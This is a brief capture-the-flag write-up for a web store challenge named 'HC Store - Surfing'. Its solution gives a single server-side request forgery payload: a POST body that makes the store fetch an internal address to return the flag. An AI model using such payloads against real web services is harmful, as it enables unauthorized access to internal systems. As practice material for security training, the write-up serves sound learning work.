# HC Store - Surfing

This web store has a least one vulnerability that you can exploit to get the flag. The store is at https://hcstore-surfing.youcanhack.me.

## Solution

Send a POST request to /getprodparam with the body `{"url": "http://192.168.1.1:8008/?productId=1&paramName=flag"}`.